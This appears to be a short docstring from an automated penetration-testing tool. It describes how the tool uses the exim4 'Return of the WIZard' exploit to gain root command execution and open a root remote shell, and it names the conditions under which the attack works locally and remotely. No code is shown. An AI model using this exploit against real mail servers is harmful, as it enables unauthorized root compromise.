    Executes the 'Return of the WIZard'-Exploit of exim4.

            Exploid-DB:             https://www.exploit-db.com/exploits/46974

    The exploit is a ROOT command execution and can be used both locally and remote.

    Local: Works on default configuration.
    Remote: Works on non-default configurations (see links above)
            Works on default configuration, but takes 7 days to execute, thus will not be used here.

    Here the exploit is used to execute a command as root, which returns a root remote shell to pinaht.
